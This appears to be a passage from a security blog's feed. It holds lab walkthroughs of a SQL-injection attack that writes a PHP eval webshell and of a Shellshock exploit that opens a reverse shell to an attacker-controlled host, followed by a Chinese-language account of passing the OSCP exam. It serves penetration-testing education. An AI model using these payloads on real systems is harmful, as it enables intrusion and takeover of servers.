</span></code></pre></td></tr></table></div></figure>


<p>The attacker will receive admin session cookie as soon as the administrator open the comments page.</p>

<h3>Exploit MySQL injection vulnerability and uploading webshell</h3>


<p>SQL Injection point:</p>

<p><font color='red'>http://192.168.1.149/admin/edit.php?id=2</font></p>


<p>Try single quote:</p>

<p><font color='red'>http://192.168.1.149/admin/edit.php?id=2′</font></p>


<p>Results:<br>
Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in <font color='red'>/var/www/classes/post.php</font> on line 111 Notice: Undefined variable: post in /var/www/classes/post.php on line 115</p>

<p>Now the attacker know the target web site’s absolute path is “/var/www/”</p>

<p>Detect backend DB information</p>

<p>
attacking code:<br>
http://192.168.1.149/admin/edit.php?id=2 order by 4 — – (OK)<br>
http://192.168.1.149/admin/edit.php?id=2 order by 5 — – (ERROR)<br><br>
http://192.168.1.149/admin/edit.php?id=-2 union select 1,@@version,user(),4
</p>


<p>Results:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Mysql Version: 5.1.72-2
</span><span class='line'>current DB user: root@localhost</span></code></pre></td></tr></table></div></figure>


<p>Due to MySQL is now runnnig by root, the attacker will grain root privilege.</p>

<p>Then the attacker is going to upload webshell.</p>

<p>attacking code：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.149/admin/edit.php?id=-2 union select 1,2,"&lt;?php @eval($_POST['chopper'])?>",4 into outfile "/var/www/css/t2.php" — –</span></code></pre></td></tr></table></div></figure>


<p>attacking code(URL encoded)：</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.1.149/admin/edit.php?id=-2%20union%20select%201%2C2%2C%22%3C%3Fphp%20@eval%28%24_POST%5B%27chopper%27%5D%29%3F%3E%22%2C4%20into%20outfile%20%22%2fvar%2fwww%2fcss%2ft2.php%22%20–%20-e</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] CVE-2014-6271/Shellshock]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/07/pentesterlab-cve-2014-6271-slash-shellshock/"/>
    <updated>2015-05-07T07:33:16-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/07/pentesterlab-cve-2014-6271-slash-shellshock</id>
    <content type="html"><![CDATA[<p>This is an exercise from <a href='https://www.pentesterlab.com/'>PentesterLab</a> to reproduce &amp; demonstrate how to exploit CVE-2014-6271 [Shellshock] vulnerability. More information and ISO download please check <a href='https://www.pentesterlab.com/exercises/cve-2014-6271'>here</a>. The <a href='https://www.pentesterlab.com/exercises/cve-2014-6271/course'>official course</a> is highly recommended to read, which explains how the bug works and the ways to exploit it for different purposes.</p>

<p>Difficulty: 1 / 5</p>

<h2>Links</h2>


<p>watch video online:</p>

<iframe src='http://player.vimeo.com/video/127037311?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe>


<!-- more -->


<h2>Method</h2>


<ul style="list-style-type:disc">
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to discover the running services and open ports [nmap]</li>
<li>By checking source code of the web page and found hidden path "/cgi-bin/status" [firefox]</li>
<li>Test and Exploit shellshock vulnerability to get reverse shell and ROOT [nc]</li>
</ul>


<h2>Tools</h2>


<p>All the tools used here can be found in Kali Linux</p>

<ul style="list-style-type:disc">
<li><a href='http://nixgeneration.com/~jaime/netdiscover/'>Net Discover</a></li>
<li><a href='https://nmap.org/'>Nmap</a></li>
<li><a href='https://www.mozilla.org/en-US/firefox/new/'>Firefox</a></li>
<li><a href='http://netcat.sourceforge.net/'>nc</a></li>
</ul>




<h2>Walkthrough</h2>


<p>This is a pretty easy one and not much things to talk. In according to we already know the server is vulnerable to ShellShock (CVE-2014-6271), so all we need to do just find the target machine, test if the vulnerability still works and exploit it to get a shell.</p>

<h3>Find and Exploit the ShellShock vulnerability</h3>


<p>After found the IP address of target server, and based on the result of Nmap scan, the attacker discovered apache is running and listening on TCP port 80.</p>

<p><img src="http://f4l13n5n0w.github.io/downloads/shellshock/1.png"></p>

<p>Then the attacker interacted with the web server, by using “Firefox” browser to graphically render the web application on the target. By checking the source code, the attacker found the CGI page which calls system command (“/cgi-bin/status”).</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/shellshock/2.png"></p>

<p>After found the CGI page, the attacker use &ldquo;wget&rdquo; to test if there is ShellShock vulnerability in this CGI page.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -c 'echo vulnerable'" http://10.10.10.129/cgi-bin/status</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/shellshock/3.png"></p>

<p>As we can see above, the command &ldquo;echo vulnerable&rdquo; has been executed by the server, so it is vulnerable to ShellShock.</p>

<p>Now it is time to exploit it. The attacker set up NC listen on port 5555 and send the following command to exploit for getting a reverse shell.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wget -U "() { test;};echo \"Content-type: text/plain\"; echo; /bin/bash -i >& /dev/tcp/10.10.10.131/5555 0>&1" http://10.10.10.129/cgi-bin/status</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/shellshock/4.png"></p>

<p>Due to pentesterlab is belong to sudoers group, so it is easy to get ROOT through &ldquo;sudo&rdquo; command.</p>

<p><img src="http://f4l13n5n0w.github.io/downloads/shellshock/5.png"></p>

<p>Game over :)</p>

<h2>Reference</h2>


<p>For more information about shell shock/bash bug, the following links have already given out good explaination.</p>

<p>[1] <a href="http://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability">http://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability</a><br>
[2] <a href="http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited">http://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited</a><br>
[3] <a href="https://blog.cloudflare.com/inside-shellshock/">https://blog.cloudflare.com/inside-shellshock/</a><br></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[经验分享] OSCP 渗透测试认证]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/05/jing-yan-fen-xiang-oscp-shen-tou-ce-shi-ren-zheng/"/>
    <updated>2015-05-05T06:48:31-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/05/jing-yan-fen-xiang-oscp-shen-tou-ce-shi-ren-zheng</id>
    <content type="html"><![CDATA[<p><img class="center" src="http://f4l13n5n0w.github.io/downloads/oscp-certs.png" width="250" height="150">
“120天的旅程即将结束，以一场历时24小时没有选择题的考试，收获屠龙路上第一座里程碑。…” 这是我通过OSCP认证考试时，第一时间的感受。自豪和欣喜之情不亚于2008年我拿下CCIE R&amp;S的时候。
关于 PWK (Pentesting with Kali Linux) 和OSCP (Offensive Security Certified Professional)，我想很多人会觉着陌生。但说起Offensive Security，BackTrack，Kali，NetHunter和Metasploit，圈里的朋友应该就熟悉多了。</p>

<!-- more -->


<p>作为在老外圈子里备受推崇的渗透测试技术类认证，国外从业人员对它的介绍和评价已经足够丰富了：</br>
<a href="http://netsec.ws/?p=398">http://netsec.ws/?p=398</a></br>
<a href="http://www.jasonbernier.com/oscp-review/">http://www.jasonbernier.com/oscp-review/</a></br>
<a href="http://leonjza.github.io/blog/2014/11/22/trying-harder-oscp-and-me/">http://leonjza.github.io/blog/2014/11/22/trying-harder-oscp-and-me/</a></br>
<a href="http://www.securitysift.com/offsec-pwb-oscp/">http://www.securitysift.com/offsec-pwb-oscp/</a></br>
<a href="http://wp.sgrosshome.com/2014/07/22/offensive-security-certified-professional-my-experience-and-review/">http://wp.sgrosshome.com/2014/07/22/offensive-security-certified-professional-my-experience-and-review/</a></br>
<a href="http://www.primalsecurity.net/0x2-course-review-penetration-testing-with-kali-linux-oscp/">http://www.primalsecurity.net/0x2-course-review-penetration-testing-with-kali-linux-oscp/</a></br>
<a href="https://www.rcesecurity.com/2013/05/oscp-course-and-exam-review/">https://www.rcesecurity.com/2013/05/oscp-course-and-exam-review/</a></br>
<a href="http://buffered.io/posts/oscp-and-me/">http://buffered.io/posts/oscp-and-me/</a></br>
<a href="http://www.hackingtheperimeter.com/2014/12/introduction-id-wanted-to-take-on-oscp.html">http://www.hackingtheperimeter.com/2014/12/introduction-id-wanted-to-take-on-oscp.html</a></br></p>

<p>然而，遗憾的发现，并没有关于这个认证的中文介绍。也许是因为语言问题，也许是因为这个认证还在起步阶段没有宣传吧。但是不同于CEH等一系列的纸上谈兵，这是一个真枪实弹的学习经历。不同于现在火热的Web攻击，这个认证更偏重于传统的内网渗透技术。</p>

<h2>关于教材</h2>


<p>300多页的教材涵盖了所有从基础知识到进阶的渗透测试技巧（当然不是深入）。所以对于没有渗透经验的朋友（但还是需要基本计算机和网络的知识，如果有编程基础会更好但不是必须），这是一个很好的入门级课程。关于这个课程的具体内容可以查看<a href='https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf'>这里</a>。</p>

<h2>关于PWK Labs</h2>


<p>相对于其他认证课程来说，OSCP与众不同也是最吸引人的是它设计详实的Online Lab（包括4个子网，57台主机/服务器，每一台主机/服务器都包含Offensive Security团队在真实工作环境中遇到的漏洞）。我的起点是VPN连接到Public Network中的一台主机，终点是渗透进入到Admin Network。 57台设备（除掉网关/防火墙）都是目标，都存在漏洞可以被攻破并获得最高权限。所以获取所有设备的最高权限（ROOT/SYSTEM）并读取证明文件（proof.txt或者network-secret.txt）也就是终极目标。在实现这个终极目标中，你不仅会学习各种exploits利用，弱密码，Web漏洞以及一系列提权技巧和漏洞利用。除了技术层面，更重要的是你能学到耐心和思路。漏洞就在那里，如果没找到只能是因为不够仔细和耐心，”TRY HARDER”是整个课程的标语。每攻破一个主机，都需要在后边自主的学习，查资料，有时还需要灵光一闪的运气。更难得的是，lab里边50多台主机服务器不是独立无关的。有时候你需要攻破特定主机并从中获取相应信息才能帮助你攻破其他的主机。而整个Lab里的高潮恐怕要算是端口转发（port forwarding）和Pivoting（实在不会翻译，类似于利用跳板进入不可路由网络）。</p>

<h2>关于考试</h2>


<p>OSCP的认证考试也是另类的存在，考生拥有24小时的时间（实际是23小时45分钟）去完成考试，具体如何分配时间由考生自己决定。题目是5台主机（随机抽取），目标是攻入并拿到最高权限（ROOT/SYSTEM）。战利品有local.txt（一般权限可得）和proof.txt（最高权限可得），分别对应不同的分数。满分100分，70分可以通过考试。24小时结束之后，你还有24小时去完成并提交考试报告（需要详细说明攻击步骤和里程碑截屏来证明确实攻破并获得相应权限）。</p>

<h2>我的经验</h2>


<p>首先，虽然课程本身是没有门槛的，但是购买Lab机时还是不便宜的。对渗透了解的越少你所需要的时间就越多，所以我还是建议先对渗透测试有一定了解之后再选择这个课程，有几个非常好的热身网站推荐给大家：</br>
<a href="http://vulnhub.com/">http://vulnhub.com/</a></br>
<a href="https://www.pentesterlab.com/">https://www.pentesterlab.com/</a></br></p>

<p>下面就是我的120天学习经历</p>

<p>由于不知道水深水浅，一开始买了60天的Lab时间。拿到教材和视频之后，大概用了一周多的时间把教材和视频过完，并完成课后练习题（这个时间取决于你的基础有多少，每天4-6个小时学习的话应该最多不会超过3周）。</p>

<p>终于可以摩拳擦掌进入在线Lab了。我的起点是Public Network里的一台电脑，利用课程里学到的知识对目标网络进行信息收集和枚举（enumeration）。Nmap是用的最多的工具之一。目标主机/服务器有着不同的难度，所以我的策略是先从头开始一个一个过，拿下简单的，如果没思路了就留下，开始下一个。过完一遍之后，再翻过头来做更仔细的枚举（enumeration）和上网查资料，直到发现漏洞。几乎所有的主机都存在“已知”漏洞，所以剩下的工作就是仔细挖掘把它找出来。然而现实并不像想象的那么简单，很多时候的感觉就是“你明明知道漏洞就在那里却找不到”的崩溃。每一台攻破的机器都包含一个proof.txt战利品文件用来证明该主机已经被征服，有时候还会发现network-secrets.txt文件用来在control panel里解开不同的子网（IT, DEV and Admin）。有些主机里还包含攻克其他主机的线索，所以对每台被攻破的主机都需要仔细检查一番，搜集尽可能多的线索。</p>

<p>很快的60天的Lab时间就用完了，我只拿下了30几台主机并解锁了2个子网（IT和DEV）。我显然还没有准备好考试，于是又续了30天的Lab。这30天里剩下的都是一些硬骨头了，更多的的利用Pivoting拿下IT和DEV子网里的主机，并解锁了Admin子网。时间又一次接近尾声，还剩下不到10台主机（其中包括“著名的”pain，sufferance和humble）。我再一次续了30天，我想拿下所有的主机。最终，除了humble和Admin子网里的Jack（获得shell但没能提权）没有拿下，我攻破并提权了其他所有的50多台主机。我想，我应该去考试了。之后花了我大概一周的时间整理出Lab实验报告，一共是369页。</p>

<p>我约的考试是从周五晚上7点开始，时长23小时45分钟。一共五台目标机器跟Lab里的一样包含已知漏洞。总分100分，70分过。</p>

<p>晚上8点27分，拿下第一台主机。
10点，第二台主机。
凌晨1点27分，第三台主机也被攻破。
然后一直到凌晨5点多，再没有建树。困得不行的我，决定小睡三小时，闹铃上到早上8点半起。截止到这时候，我只有50分。
8点半起来继续研究，终于10点52分，拿下第四台主机（我认为是最难的一台）。
这时已经拿到75分，可以过了。中午简单的吃了些午饭，回来继续最后一个主机。</p>

<p>又过了几个小时的网上搜索，修改和测试，终于在下午2点35分的时候攻破最后一台主机。这时我拿到了100分。在反复检查和做好所有截屏工作之后，我决定先去好好的睡一觉。24小时的考试结束后，我还有24小时的时间整理和提交考试报告。
一觉睡到晚上9点多，起来写报告。因为只有五台主机，又有了之前Lab报告的经验，截屏和记录工作做的还不错，报告花了我大概2两个多小时就结束了。之后就是打包上传，然后再去睡个好觉 :)</p>

<p>过了一天，收到了下边的邮件，写下了开头的那句话。</p>

<p><img class="center" src="http://f4l13n5n0w.github.io/downloads/oscp.png">
最后，感谢IRC里的admin们和所有聊过天，帮助过我的朋友：</p>

<ul style="list-style-type:disc">
<li>goodbestguy</li>
<li>haken29a</li>
<li>loneferret</li>
<li>bolexxx</li>
<li>g0tmi1k_</li>
<li>stormtide31</li>
<li>Zipkoppie</li>
<li>B34</li>
</ul>


<p>最最后，发几个对Lab和考试有帮助的总结帖子（cheat sheets）:</p>

<p><ul style="list-style-type:disc">
<li><a href='http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet'>Reverse shell cheat sheet</a></li>
<li><a href='https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/'>Basic Linux Privilege Escalation</a></li>
<li><a href='http://netsec.ws/?p=331'>Creating Metasploit Payloads</a></li>
<li><a href='https://sathisharthars.wordpress.com/2015/01/28/oscp-offensive-security-certified-professional-handy-tips-and-tricks/'>OSCP Handy Tips and Tricks</a></li></p>
]]></content>
  </entry>
  
</feed>
